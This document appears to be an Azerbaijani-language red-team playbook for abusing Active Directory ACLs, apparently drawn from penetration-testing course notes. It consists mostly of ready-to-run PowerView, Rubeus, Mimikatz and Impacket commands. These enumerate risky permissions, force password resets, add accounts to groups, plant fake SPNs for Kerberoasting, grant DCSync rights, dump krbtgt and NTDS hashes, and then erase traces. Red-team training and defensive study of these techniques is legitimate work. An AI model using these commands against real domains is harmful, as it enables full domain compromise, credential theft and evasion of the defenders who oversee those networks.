# Active Directory — ACL Abuse Playbook

> **Məqsəd:** Ümumi ACL enumeration-dan başlayaraq, spesifik user/group/computer/OU obyektləri üzərindəki dərin ACL analizinə qədər addım-addım metodologiya.

---

## Mündəricat

1. [Ümumi ACL Enumeration](#1-ümumi-acl-enumeration)
2. [Riskli Hüquqların Aşkarlanması](#2-riskli-hüquqların-aşkarlanması)
3. [User Mərkəzli ACL Analizi](#3-user-mərkəzli-acl-analizi)
4. [Group ACL Analizi](#4-group-acl-analizi)
5. [Computer ACL Analizi](#5-computer-acl-analizi)
6. [OU ACL Analizi](#6-ou-acl-analizi)
7. [Domain Root ACL Analizi](#7-domain-root-acl-analizi)
8. [SID-Əsaslı Hədəfli Axtarış](#8-sid-əsaslı-hədəfli-axtarış)
9. [Extended Rights Analizi](#9-extended-rights-analizi)
10. [Dərin Cross-Object ACL Analizi](#10-dərin-cross-object-acl-analizi)
11. [SharpHound ilə Avtomatik Toplama](#11-sharphound-ilə-avtomatik-toplama)
12. [Impacket / Linux Tərəfindən LDAP Enum](#12-impacket--linux-tərəfindən-ldap-enum)
13. [ACL Rights Mask Referansı](#13-acl-rights-mask-referansı)
14. [ACL Abuse Taktikları](#14-acl-abuse-taktikları)
15. [Change Password ACL Abuse](#15-change-password-acl-abuse)
16. [SID-dən Hesab Tanimlaması](#16-sidlər-ilə-hesab-tanımlama)
17. [Təmizlik — Cleanup](#17-təmizlik--cleanup)

---

## 0. Hazırlıq

```powershell
# PowerView-i yüklə
Import-Module .\PowerView.ps1

# ActiveDirectory modulunun mövcudluğunu yoxla
Get-Module ActiveDirectory
```

---

## 1. Ümumi ACL Enumeration

Domendəki **bütün obyektlərin** ACL-lərini çək. Başlanğıc nöqtəsi budur.

```powershell
# Bütün ACL-lər — raw dump
Get-DomainObjectAcl -ResolveGUIDs | Select ObjectDN, ActiveDirectoryRights, IdentityReference
```

> ⚠️ Böyük domenlər üçün çox vaxt apara bilər. Nəticəni fayla yönləndir:
```powershell
Get-DomainObjectAcl -ResolveGUIDs | Select ObjectDN, ActiveDirectoryRights, IdentityReference | Export-Csv acl_dump.csv -NoTypeInformation
```

---

## 2. Riskli Hüquqların Aşkarlanması

### 2.1 — Bütün Domendə Riskli ACL-lər

```powershell
Get-DomainObjectAcl -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner|DeleteChild"
} | ft ObjectDN, ActiveDirectoryRights, IdentityReference -AutoSize
```

### 2.2 — Auto Discovery (Find-InterestingDomainAcl)

```powershell
# PowerView-in daxili funksiyası ilə maraqlı ACL-ləri tap
Find-InterestingDomainAcl
Find-InterestingDomainAcl -ResolveGUIDs | ft ObjectDN, IdentityReferenceName, ActiveDirectoryRights -AutoSize
```

---

## 3. User Mərkəzli ACL Analizi

### 3.1 — Tək bir User üzərindəki ACL-lər (kim nə hüquqa sahibdir)

```powershell
# Hansı principal-ların <TARGET_USER> üzərində hüququ var
Get-ObjectAcl -Identity <TARGET_USER> -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite|AllExtendedRights|WriteProperty"
} | Select ObjectDN, ActiveDirectoryRights, IdentityReference
```

### 3.2 — Bütün User-lər üzərindəki Riskli ACL-lər

```powershell
Get-DomainUser | ForEach-Object {
    Get-ObjectAcl -Identity $_.SamAccountName -ResolveGUIDs
} | ? {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"
} | Select ObjectDN, ActiveDirectoryRights, IdentityReference
```

### 3.3 — Cari Session User-inin Özünə Aid ACL-lər

```powershell
# Özünüzün hər hansı obyekt üzərindəki GenericAll / Force-Change-Password hüquqlarınızı tap
Get-DomainObjectACL -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match 'GenericAll' -or
    $_.ObjectAceType -match 'User-Force-Change-Password'
} | ? {
    $_.SecurityIdentifier -match (Get-DomainUser -Identity $env:USERNAME -Properties objectsid).objectsid
}
```

---

## 4. Group ACL Analizi

### 4.1 — Bir Group üzərindəki Bütün ACL-lər

```powershell
Get-ObjectAcl -Identity "<GROUP_NAME>" -ResolveGUIDs
```

### 4.2 — Müəyyən User-in Bir Group üzərindəki ACL-i

```powershell
# Məsələn: damundsen adlı user-in "Help Desk Level 1" üzərindəki ACL-i
Get-ObjectAcl -Identity "Help Desk Level 1" -ResolveGUIDs | ? {
    $_.IdentityReference -match "damundsen"
}
```

### 4.3 — Group-dan Group-a Zəncir Analizi (MemberOf Chain)

```powershell
Get-DomainGroup -Identity "Help Desk Level 1" | Select memberof

# Bütün zənciri açmaq üçün
Get-DomainGroup -Identity "Help Desk Level 1" | % {
    Get-DomainGroup -Identity $_.memberof
} | Select Name, MemberOf
```

### 4.4 — Group Üzvlüyü

```powershell
Get-DomainGroupMember -Identity "<GROUP_NAME>" | Select-Object MemberName
```

---

## 5. Computer ACL Analizi

### 5.1 — Tək Computer üzərindəki Riskli ACL-lər

```powershell
Get-ObjectAcl -Identity <COMPUTERNAME>$ -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"
}
```

### 5.2 — Bütün Computer-lər üzərindəki Riskli ACL-lər

```powershell
Get-DomainComputer | ForEach-Object {
    Get-ObjectAcl -Identity $_.SamAccountName -ResolveGUIDs
} | ? {
    $_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteDacl|WriteOwner"
} | Select ObjectDN, ActiveDirectoryRights, IdentityReference
```

### 5.3 — RBCD üçün CreateChild Yoxlaması (Machine Account üzərindəki Yazma)

```powershell
# Kim hansı computer-ə msDS-AllowedToActOnBehalfOfOtherIdentity yaza bilər
Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll"
} | Select ObjectDN, ActiveDirectoryRights, IdentityReference
```

---

## 6. OU ACL Analizi

### 6.1 — OU-lar üzərindəki CreateChild Hüquqları

```powershell
# OU-da GPO link etmə və ya child obyekt yaratma üçün istifadə olunur
Get-DomainOU | Get-ObjectAcl -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match "CreateChild|GenericAll|WriteDacl"
} | Select ObjectDN, ActiveDirectoryRights, IdentityReference
```

### 6.2 — Tək OU üzərindəki ACL-lər

```powershell
Get-ObjectAcl -Identity "OU=Workstations,DC=domain,DC=com" -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|CreateChild"
}
```

---

## 7. Domain Root ACL Analizi

```powershell
# Domain root-a kimin DCSync, WriteDacl, GenericAll-ı var?
Get-DomainObjectAcl -ResolveGUIDs | ? {
    $_.ObjectDN -match "^DC="
} | ? {
    $_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|ExtendedRight"
} | Select ObjectDN, ActiveDirectoryRights, IdentityReference
```

> 🎯 **DCSync üçün lazım olan Extended Rights:**
> - `DS-Replication-Get-Changes` — GUID: `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`
> - `DS-Replication-Get-Changes-All` — GUID: `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`

---

## 8. SID-Əsaslı Hədəfli Axtarış

### 8.1 — SID-i Bil, ACL-lərini Tap

```powershell
# Username-dən SID al
$sid = Convert-NameToSid <USERNAME>

# Bu SID-in bütün domendəki ACL-ləri
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {
    $_.SecurityIdentifier -eq $sid
}
```

### 8.2 — Bir Hesabın Bütün Əlçatan Hüquqları (User + Groups dahil)

```powershell
# USER1-in aid olduğu bütün group SID-lərini + öz SID-ini topla
$UserGroupsSIDs = Get-DomainGroup -MemberIdentity <USER1> | Select-Object -ExpandProperty objectsid
$UserSID       = (Get-DomainUser -Identity <USER1>).objectsid
$AllSIDs       = $UserGroupsSIDs + $UserSID

# Bu SID-lərdən hər hansının malik olduğu bütün ACL-lər
Get-DomainObjectACL -ResolveGUIDs | ? {
    $AllSIDs -contains $_.SecurityIdentifier
} | Select ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType
```

---

## 9. Extended Rights Analizi

### 9.1 — Force-Change-Password GUID-ini Tap

```powershell
Get-ADObject `
    -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
    -LDAPFilter "(name=*Force*)" `
    -Properties rightsGuid |
    Select Name, DisplayName, RightsGuid
```

### 9.2 — Manuel GUID Axtarışı

```powershell
$guid = "00299570-246d-11d0-a768-00aa006e0529"

Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" `
    -Filter { ObjectClass -like 'ControlAccessRight' } -Properties * |
    Select Name, DisplayName, DistinguishedName, rightsGuid |
    ? { $_.rightsGuid -eq $guid }
```

### 9.3 — Force-Change-Password Hüququ Olan Bütün ACE-lər

```powershell
Get-DomainObjectACL -ResolveGUIDs | ? {
    $_.ObjectAceType -match 'User-Force-Change-Password'
} | Select ObjectDN, SecurityIdentifier | Out-GridView
```

---

## 10. Dərin Cross-Object ACL Analizi

Bu bölmə **bir principal-ın (user/group) digər principal üzərindəki** hüquqlarını dərindən araşdırır.

### 10.1 — USER1-in Bütün User-lər Üzərindəki ACL-ləri

```powershell
$SourceSID = (Get-DomainUser -Identity <USER1> -Properties objectsid).objectsid

Get-DomainObjectACL -ResolveGUIDs | ? {
    $_.SecurityIdentifier -eq $SourceSID
} | ? {
    $_.ObjectAceType -eq "User" -or
    $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl"
} | Select ObjectDN, ActiveDirectoryRights, ObjectAceType
```

### 10.2 — USER1-in Spesifik USER2 Üzərindəki ACL-ləri

```powershell
$SID = (Get-DomainUser -Identity <USER1>).objectsid
Get-DomainObjectACL -Identity <USER2> -ResolveGUIDs | ? {
    $_.SecurityIdentifier -eq $SID
}
```

### 10.3 — USER1-in Üzv Olduğu Bütün Group-ların USER2 Üzərindəki Hüquqları

```powershell
$UserGroupsSIDs = Get-DomainGroup -MemberIdentity <USER1> | Select-Object -ExpandProperty objectsid
$UserSID        = (Get-DomainUser -Identity <USER1>).objectsid
$AllSIDs        = $UserGroupsSIDs + $UserSID

Get-DomainObjectACL -Identity <USER2> -ResolveGUIDs | ? {
    $AllSIDs -contains $_.SecurityIdentifier
} | Select ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType
```

### 10.4 — Başqalarının USER1 Üzərindəki Hüquqları (inbound)

```powershell
# Kim USER1-ə nə edə bilər?
Get-DomainObjectACL -Identity <USER1> -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match "GenericAll|WriteProperty|WriteDacl|GenericWrite|AllExtendedRights"
} | Select SecurityIdentifier, ActiveDirectoryRights, ObjectAceType
```

### 10.5 — SID-dən İsim Çevirmə

```powershell
"SID1", "SID2" | ConvertFrom-SID

# Və ya tək SID
Convert-SidToName <SID>
```

---

## 11. SharpHound ilə Avtomatik Toplama

```cmd
SharpHound.exe --CollectionMethods All --Domain domain.com --OutputDirectory C:\Users\htb-student\Desktop\bloodhound
```

BloodHound-da axtarılacaq əsas sorğular:

| Sorğu | Məqsəd |
|-------|--------|
| `Find All Domain Admins` | DA-ların tam siyahısı |
| `Shortest Paths to Domain Admins` | Privilege escalation yolları |
| `Find Principals with DCSync Rights` | DCSync-ə malik hesablar |
| `Users with Foreign Domain Group Membership` | Cross-domain hüquqlar |

---

## 12. Impacket / Linux Tərəfindən LDAP Enum

```bash
# ldapdomaindump — bütün ACL-ləri çək
ldapdomaindump -u 'domain\user' -p 'pass' <DC_IP> -o /tmp/ldapdump/

# Riskli ACE-ləri grep et
grep -r "GenericAll\|WriteDacl\|WriteOwner\|GenericWrite" /tmp/ldapdump/

# Secretsdump ilə NTDS-dən hash çıxart (DA lazımdır)
secretsdump.py domain/admin@<DC_IP> -just-dc
```

---

## 13. ACL Rights Mask Referansı

| Mask | Hüquq | Abuse Potensialı |
|------|-------|-----------------|
| `0x00000001` | CreateChild | Machine account yaratmaq → RBCD |
| `0x00000002` | DeleteChild | GPO / admin hesab silmək (DoS) |
| `0x00000004` | ListChildren | Child obyektləri görünmək (Recon) |
| `0x00000008` | Self | SPN, xüsusi atribut write |
| `0x00000010` | ReadProperty | SPN, LAPS, delegation məlumatları oxumaq |
| `0x00000020` | WriteProperty | SPN add → Kerberoast, RBCD, group üzvlüyü |
| `0x00000040` | DeleteTree | Subtree silmək (DoS) |
| `0x00000080` | ListObject | Gizli obyektlər (Advanced recon) |
| `0x00000100` | ExtendedRight | ResetPassword, DCSync (GUID-dən asılı) |
| `0x00010000` | Delete | Obyekt silmək |
| `0x00020000` | ReadControl | Security descriptor oxumaq |
| `0x00040000` | WriteDacl | ACL dəyişmək → özünə GenericAll vermək |
| `0x00080000` | WriteOwner | Owner dəyişmək → sonra WriteDacl ilə tam nəzarət |
| `0x10000000` | GenericAll | Full control — ResetPass, DCSync, persistence |
| `0x20000000` | GenericExecute | Məhdud icra (eskalasiya nadir) |
| `0x40000000` | GenericWrite | Atributlara write — SPN, RBCD, group takeover |
| `0x80000000` | GenericRead | Geniş oxuma — Kerberoast recon, LAPS |

---

## 14. ACL Abuse Taktikları

### 14.1 — PSCredential Yaratmaq

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $SecPassword)
```

### 14.2 — User Şifrəsini Dəyişmək (ForceChangePassword)

```powershell
$NewPass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $NewPass -Credential $Cred -Verbose
```

### 14.3 — Group-a Üzv Əlavə Etmək (GenericAll / GenericWrite)

```powershell
# Mövcud üzvləri yoxla
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

# Əlavə et
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'targetuser' -Credential $Cred -Verbose

# Təsdiqlə
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

### 14.4 — Fake SPN Yaratmaq → Targeted Kerberoasting

```powershell
# SPN əlavə et
Set-DomainObject -Credential $Cred -Identity <TARGET_USER> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Kerberoast
.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap

# SPN-i sil (cleanup)
Set-DomainObject -Credential $Cred -Identity <TARGET_USER> -Clear serviceprincipalname -Verbose
```

### 14.5 — WriteDacl ilə Özünə GenericAll Vermək

```powershell
# WriteDacl hüququn varsa, hədəf obyektə özün üçün GenericAll əlavə et
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <YOUR_USER> -Rights All -Credential $Cred -Verbose
```

### 14.6 — WriteOwner → Owner Dəyişmə → WriteDacl

```powershell
# Owner-i özünə dəyiş
Set-DomainObjectOwner -Identity <TARGET> -OwnerIdentity <YOUR_USER> -Credential $Cred -Verbose

# Sonra ACL dəyiş
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <YOUR_USER> -Rights All -Credential $Cred -Verbose
```

### 14.7 — DCSync (Domain Root-da DS-Replication Hüquqları)

```powershell
# PowerView ilə DS-Replication hüquqları əlavə et (WriteDacl lazımdır)
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity <YOUR_USER> -Rights DCSync -Credential $Cred -Verbose

# Mimikatz ilə DCSync
lsadump::dcsync /domain:domain.com /user:krbtgt
```

---

## 15. Change Password ACL Abuse

```powershell
# Cari user üçün Force-Change-Password və ya GenericAll hüququnu tap
Get-DomainObjectACL -ResolveGUIDs | ? {
    $_.ActiveDirectoryRights -match 'GenericAll' -or
    $_.ObjectAceType -match 'User-Force-Change-Password'
} | ? {
    $_.SecurityIdentifier -match (Get-DomainUser -Identity $env:USERNAME -Properties objectsid).objectsid
}

# Bütün domendə Force-Change-Password ACE-lərini grid-də göstər
Get-DomainObjectACL -ResolveGUIDs | ? {
    $_.ObjectAceType -match 'User-Force-Change-Password'
} | Select-Object ObjectDN, SecurityIdentifier | Out-GridView
```

---

## 16. SID-lər ilə Hesab Tanımlama

Bir SID-in hansı user/group/computer-ə aid olduğunu bilmirsənsə:

```powershell
# SID-dən hesab adı tap
"S-1-5-21-XXXX-XXXX-XXXX-<RID>" | ConvertFrom-SID

# RID-ə görə user tap
Get-DomainUser -Properties samaccountname, objectsid | ? { $_.objectsid -like '*-<RID>' }

# RID-ə görə group tap
Get-DomainGroup -Properties samaccountname, objectsid | ? { $_.objectsid -like '*-<RID>' }

# RID-ə görə computer tap
Get-DomainComputer -Properties samaccountname, objectsid | ? { $_.objectsid -like '*-<RID>' }
```

---

## 17. Təmizlik — Cleanup

Abuse əməliyyatlarından sonra izləri təmizlə:

```powershell
# Group üzvlüyünü geri al
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'targetuser' -Credential $Cred -Verbose

# Silinib-silinmədiyini yoxla
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? { $_.MemberName -eq 'targetuser' }

# Fake SPN-i sil
Set-DomainObject -Credential $Cred -Identity <TARGET_USER> -Clear serviceprincipalname -Verbose

# Əlavə edilmiş ACL-ləri sil
Remove-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <YOUR_USER> -Rights All -Credential $Cred -Verbose
```

---

## Qısa Referans — Abuse Qərar Ağacı

```
GenericAll       → Şifrə dəyiş / SPN əlavə et / DCSync / Group üzvlüyü
GenericWrite     → SPN əlavə et (Kerberoast) / RBCD / atribut yaz
WriteDacl        → Özünə GenericAll ver → Full control
WriteOwner       → Owner ol → WriteDacl → GenericAll
ForceChangePass  → Şifrəni birbaşa dəyiş
CreateChild (OU) → GPO yaradıb link et → OU-dakı bütün kompüter/user-ləri idarə et
WriteProperty    → SPN add / member add / RBCD setup
AllExtendedRight → ForceChangePassword + DCSync (kontextdən asılı)
```

---

*Son yenilənmə: 2026 — PowerView + BloodHound metodologiyası əsasında hazırlanmışdır.*
